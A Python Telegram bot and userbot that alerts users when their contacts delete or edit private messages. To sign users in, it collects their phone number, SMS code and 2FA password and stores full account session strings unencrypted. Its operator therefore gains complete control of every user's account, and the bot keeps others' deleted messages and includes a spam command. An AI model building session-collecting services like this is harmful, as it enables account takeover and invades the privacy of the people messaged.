import asyncio
import sqlite3
import os
from datetime import datetime
from threading import Thread
from flask import Flask
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from aiogram import Bot, Dispatcher, types as aiogram_types
from aiogram.utils import executor
import nest_asyncio
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
nest_asyncio.apply()

# ========== КОНФИГ ==========
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')
BOT_TOKEN = os.environ.get('BOT_TOKEN')

# ========== БД ==========
conn = sqlite3.connect('userbot.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIMARY KEY, session_string TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS muted_users (user_id INTEGER, muted_by INTEGER, PRIMARY KEY (user_id, muted_by))''')
cursor.execute('''CREATE TABLE IF NOT EXISTS saved_messages (id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, msg_id INTEGER, sender_id INTEGER, text TEXT, date TEXT)''')
conn.commit()

# ========== ГЛОБАЛЬНЫЕ ХРАНИЛИЩА ==========
active_clients = {}
saved_messages = {}
temp_auth = {}

# ========== БОТ ДЛЯ РЕГИСТРАЦИИ И УВЕДОМЛЕНИЙ ==========
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

def get_code_keyboard():
    kb = aiogram_types.InlineKeyboardMarkup(row_width=3)
    for i in range(1, 10):
        kb.insert(aiogram_types.InlineKeyboardButton(str(i), callback_data=f"c_{i}"))
    kb.row(
        aiogram_types.InlineKeyboardButton("0", callback_data="c_0"),
        aiogram_types.InlineKeyboardButton("⌫", callback_data="c_del"),
        aiogram_types.InlineKeyboardButton("✅", callback_data="c_ok")
    )
    return kb

@dp.message_handler(commands=['start'])
async def start_auth(message: aiogram_types.Message):
    user_id = message.from_user.id
    
    cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (user_id,))
    row = cursor.fetchone()
    if row:
        await message.answer("✅ Ты уже авторизован! Юзербот активен.\n\nУведомления об удалении/изменении сообщений будут приходить сюда.")
        if user_id not in active_clients:
            asyncio.create_task(run_userbot(user_id, row[0]))
        return
    
    kb = aiogram_types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(aiogram_types.KeyboardButton("📱 Поделиться номером", request_contact=True))
    await message.answer("🔐 Отправь свой номер телефона для входа в твой аккаунт Telegram", reply_markup=kb)

@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
async def get_phone(message: aiogram_types.Message):
    user_id = message.from_user.id
    phone = message.contact.phone_number
    
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        temp_auth[user_id] = {
            "client": client,
            "phone": phone,
            "hash": result.phone_code_hash,
            "code": ""
        }
        await message.answer("📱 Введи код из SMS:", reply_markup=get_code_keyboard())
        await message.answer("Используй кнопки", reply_markup=aiogram_types.ReplyKeyboardRemove())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.callback_query_handler(lambda c: c.data.startswith('c_'))
async def code_callback(callback: aiogram_types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id not in temp_auth:
        await callback.answer("Начни заново /start")
        return
    
    action = callback.data[2:]
    current = temp_auth[user_id]["code"]
    
    if action == "del":
        temp_auth[user_id]["code"] = current[:-1]
    elif action == "ok":
        if len(current) == 5:
            await callback.answer("Авторизация...")
            await complete_auth(callback, user_id)
            return
        else:
            await callback.answer(f"Нужно 5 цифр (сейчас {len(current)})", show_alert=True)
            return
    else:
        if len(current) < 5:
            temp_auth[user_id]["code"] = current + action
    
    code = temp_auth[user_id]["code"]
    display = code if code else " "
    await callback.message.edit_text(f"📱 Код: `{display}`", parse_mode="Markdown", reply_markup=get_code_keyboard())
    await callback.answer()

async def complete_auth(callback, user_id: int):
    data = temp_auth[user_id]
    try:
        await data["client"].sign_in(phone=data["phone"], code=data["code"], phone_code_hash=data["hash"])
        session_str = data["client"].session.save()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string) VALUES (?, ?)', (user_id, session_str))
        conn.commit()
        await callback.message.answer("✅ Авторизация успешна!\n\nТеперь все уведомления об удалении/изменении сообщений будут приходить сюда.")
        asyncio.create_task(run_userbot(user_id, session_str))
        await data["client"].disconnect()
        del temp_auth[user_id]
    except Exception as e:
        if "2FA" in str(e) or "password" in str(e).lower():
            await callback.message.answer("🔐 Введи пароль от 2FA:")
            temp_auth[user_id]["step"] = "2fa"
        else:
            await callback.message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(lambda msg: msg.from_user.id in temp_auth and temp_auth[msg.from_user.id].get("step") == "2fa")
async def handle_2fa(message: aiogram_types.Message):
    user_id = message.from_user.id
    data = temp_auth[user_id]
    try:
        await data["client"].sign_in(password=message.text.strip())
        session_str = data["client"].session.save()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string) VALUES (?, ?)', (user_id, session_str))
        conn.commit()
        await message.answer("✅ Авторизация успешна!\n\nТеперь все уведомления будут приходить сюда.")
        asyncio.create_task(run_userbot(user_id, session_str))
        await data["client"].disconnect()
        del temp_auth[user_id]
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# ========== ЮЗЕРБОТ ==========

async def run_userbot(owner_id: int, session_string: str):
    if owner_id in active_clients:
        try:
            await active_clients[owner_id].disconnect()
        except:
            pass
    
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    await client.connect()
    
    if not await client.is_user_authorized():
        logging.error(f"❌ {owner_id} не авторизован")
        return
    
    active_clients[owner_id] = client
    saved_messages[owner_id] = {}
    logging.info(f"✅ Юзербот запущен для {owner_id}")
    
    # Загружаем мут-лист
    cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
    muted_users = {row[0] for row in cursor.fetchall()}
    
    # ========== 1. СОХРАНЕНИЕ ВХОДЯЩИХ СООБЩЕНИЙ ==========
    @client.on(events.NewMessage)
    async def save_incoming(event):
        if not event.is_private:
            return
        if event.out:
            return
        
        sender_id = event.sender_id
        msg_id = event.id
        text = event.text or ""
        
        if sender_id in muted_users:
            await event.delete()
            logging.info(f"🗑 {owner_id}: удалено от {sender_id}")
            return
        
        if text:
            saved_messages[owner_id][msg_id] = {
                "sender_id": sender_id,
                "text": text
            }
            cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)',
                          (owner_id, msg_id, sender_id, text, datetime.now().isoformat()))
            conn.commit()
            logging.info(f"💾 {owner_id}: сохранено {msg_id} от {sender_id}: {text[:50]}")
    
    # ========== 2. УВЕДОМЛЕНИЯ ОБ УДАЛЕНИИ (ОТ БОТА) ==========
    @client.on(events.MessageDeleted)
    async def on_delete(event):
        for msg_id in event.deleted_ids:
            # Ищем в памяти
            msg = saved_messages.get(owner_id, {}).get(msg_id)
            
            if not msg:
                cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
                row = cursor.fetchone()
                if row:
                    msg = {"sender_id": row[0], "text": row[1]}
            
            if msg and msg["sender_id"] != owner_id:
                try:
                    user = await client.get_entity(msg["sender_id"])
                    name = user.first_name or "Пользователь"
                    
                    # ОТПРАВЛЯЕМ ЧЕРЕЗ БОТА
                    await bot.send_message(
                        owner_id,
                        f"🗑 <b>{name}</b> удалил сообщение:\n\n<blockquote>{msg['text'][:500]}</blockquote>",
                        parse_mode='HTML'
                    )
                    logging.info(f"✅ Уведомление об удалении отправлено ботом для {owner_id}")
                    
                    cursor.execute('DELETE FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
                    conn.commit()
                    if msg_id in saved_messages.get(owner_id, {}):
                        del saved_messages[owner_id][msg_id]
                        
                except Exception as e:
                    logging.error(f"Ошибка: {e}")
    
    # ========== 3. УВЕДОМЛЕНИЯ ОБ ИЗМЕНЕНИИ (ОТ БОТА) ==========
    @client.on(events.MessageEdited)
    async def on_edit(event):
        if not event.is_private or event.out:
            return
        
        msg_id = event.id
        new_text = event.text or ""
        
        msg = saved_messages.get(owner_id, {}).get(msg_id)
        
        if not msg:
            cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
            row = cursor.fetchone()
            if row:
                msg = {"sender_id": row[0], "text": row[1]}
        
        if msg and msg["sender_id"] != owner_id and msg["text"] != new_text:
            try:
                user = await client.get_entity(msg["sender_id"])
                name = user.first_name or "Пользователь"
                
                # ОТПРАВЛЯЕМ ЧЕРЕЗ БОТА
                await bot.send_message(
                    owner_id,
                    f"✏️ <b>{name}</b> изменил сообщение:\n\n"
                    f"<b>Было:</b>\n<blockquote>{msg['text'][:200]}</blockquote>\n"
                    f"<b>Стало:</b>\n<blockquote>{new_text[:200]}</blockquote>",
                    parse_mode='HTML'
                )
                logging.info(f"✅ Уведомление об изменении отправлено ботом для {owner_id}")
                
                cursor.execute('UPDATE saved_messages SET text=? WHERE owner_id=? AND msg_id=?', (new_text, owner_id, msg_id))
                conn.commit()
                saved_messages[owner_id][msg_id]["text"] = new_text
                
            except Exception as e:
                logging.error(f"Ошибка: {e}")
    
    # ========== 4. КОМАНДЫ ==========
    @client.on(events.NewMessage)
    async def commands(event):
        if not event.is_private:
            return
        if not event.out:
            return
        
        text = event.text or ""
        if not text.startswith('.'):
            return
        
        logging.info(f"📨 Команда от {owner_id}: {text}")
        
        if text == '.help':
            await event.edit("""<b>📝 КОМАНДЫ ЮЗЕРБОТА</b>

<i>Работает только в ЛИЧНЫХ СООБЩЕНИЯХ</i>

<blockquote>
<b>.help</b> - эта справка
<b>.mute</b> (ответ) - заглушить
<b>.unmute</b> (ответ) - разглушить
<b>.list</b> - список замьюченных
<b>.info</b> (ответ) - инфо
<b>.type [текст]</b> - печать
<b>.spam [кол-во] [текст]</b> - спам
</blockquote>

<i>Уведомления об удалении/изменении приходят сюда от бота</i>""", parse_mode='HTML')
            return
        
        if text == '.mute':
            reply = await event.get_reply_message()
            if reply and reply.sender_id and reply.sender_id != owner_id:
                cursor.execute('INSERT OR IGNORE INTO muted_users VALUES (?, ?)', (reply.sender_id, owner_id))
                conn.commit()
                muted_users.add(reply.sender_id)
                await event.edit(f'🔕 Заглушен')
            return
        
        if text == '.unmute':
            reply = await event.get_reply_message()
            if reply and reply.sender_id:
                cursor.execute('DELETE FROM muted_users WHERE user_id=? AND muted_by=?', (reply.sender_id, owner_id))
                conn.commit()
                muted_users.discard(reply.sender_id)
                await event.edit(f'🔔 Разглушен')
            return
        
        if text == '.list':
            if muted_users:
                names = []
                for uid in list(muted_users)[:20]:
                    try:
                        u = await client.get_entity(uid)
                        names.append(f"• {u.first_name}")
                    except:
                        names.append(f"• {uid}")
                await event.edit("🔕 Замьюченные:\n" + "\n".join(names))
            else:
                await event.edit("🔕 Нет")
            return
        
        if text == '.info':
            reply = await event.get_reply_message()
            if reply:
                try:
                    u = await client.get_entity(reply.sender_id)
                    muted = "✅" if reply.sender_id in muted_users else "❌"
                    await event.edit(f"ID: {u.id}\nИмя: {u.first_name}\nЗаглушен: {muted}")
                except:
                    pass
            return
        
        if text.startswith('.type '):
            txt = text[6:]
            if txt:
                await event.edit(".")
                typed = ""
                for ch in txt:
                    typed += ch
                    try:
                        await event.edit(typed)
                    except:
                        pass
                    await asyncio.sleep(0.3)
            return
        
        if text.startswith('.spam '):
            parts = text.split(' ', 2)
            if len(parts) >= 2:
                try:
                    count = min(int(parts[1]), 20)
                    msg = parts[2] if len(parts) > 2 else None
                    if not msg:
                        reply = await event.get_reply_message()
                        if reply:
                            msg = reply.text
                    if msg:
                        await event.delete()
                        for i in range(count):
                            await client.send_message(event.chat_id, msg)
                            await asyncio.sleep(0.3)
                except:
                    pass
            return
    
    await client.run_until_disconnected()

# ========== ВЕБ-СЕРВЕР ==========
flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    return "OK"

def run_web():
    flask_app.run(host='0.0.0.0', port=8080)

async def restore_sessions():
    cursor.execute('SELECT user_id, session_string FROM user_sessions')
    for user_id, session_str in cursor.fetchall():
        asyncio.create_task(run_userbot(user_id, session_str))

async def main():
    logging.info("🚀 Запуск...")
    await restore_sessions()
    while True:
        await asyncio.sleep(10)

if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    Thread(target=lambda: executor.start_polling(dp, skip_updates=True), daemon=True).start()
    asyncio.run(main())
